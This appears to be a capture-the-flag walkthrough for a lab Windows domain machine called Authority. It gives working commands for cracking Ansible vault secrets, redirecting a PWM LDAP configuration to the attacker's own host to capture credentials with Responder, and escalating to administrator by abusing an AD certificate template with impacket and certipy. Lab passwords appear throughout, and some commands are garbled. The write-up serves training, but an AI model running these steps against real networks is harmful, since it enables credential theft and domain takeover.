#Nmap

```
smbclient -L ip
smbclient \\\\10.10.11.222\\Development

2.cd \Automation\Ansible\PWM\defaults\
3.get main.yml
```

```
cat main.yml

#OUTPUT
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

pwm_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

          decrypt with ansible2john <filename>

          and then copy its ansible password then fill it in file then to decrypt it u need hash with john tools

          john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtt

          then u got the password after that go back the passwd then cat <file_name> | ansible-vault decrypt

Vault Password:!@#$%^\* (password already decrypted)

then u will got the user then to get password use same way to get user

username:svc*pwm
Password:pWm*@dm!N\_!23

login on https://10.10.11.222:8443/pwm/private/login
then select "Configuration Manager"
then fill the password u decrypted

after you login Download configuration and then u just find it this code

```<value>ldaps://authority.authority.htb:636</value>```

then change it to  
``` <value>ldap://<Your-Ip-Tun0>:389</value>```

then saved it then back to the website click "Import Configuration"

next upload file already changed , so open terminal run command

responder -I tun0 -wA

and then u got the password , next way go to evil-winrm to capture the flag

evil-winrm -i 10.10.11.222 -u svc_ldap -p "<password>"
lDaP_1n_th3_cle4r!

# Privilege Escalation

impacket-addcomputer authority.htb/svc_ldap:<password> -dc-ip 10.10.11.222 -computer-name '<give_any_name>' -computer-pass '<give_any_pass>'

#Example
impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -computer-name 'hack' -computer-pass '123'

# Certipy Installation
```
git clone https://github.com/ly4k/Certipy.git
cd Certipy 
pip3 install certipy-ad
python3 setup.py install
```

```
certipy find -u 'test1$' -p '123' -dc-ip 10.10.11.222c  certipy req -username 'hack$' -password '123' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb
```

if u got some error u need copy authority.authority.htb to /etc/hosts
and run command sudo ntpdate -u authority.authority.htb ntpdate for create time

```
#Output
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

the private keys saved on your linux , so we just login ldap to add user

#Ldap Command
certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell
run command help to see command 
# help

```
add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.```



add_user_to_group svc_ldap 'Administrator'


now exit LDAP go back linux run evil-wirnm for capture the flag root

evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

after you logged in you just 
"cd C:\Users\Administrator\Desktop"
cat root.txt
de8**************
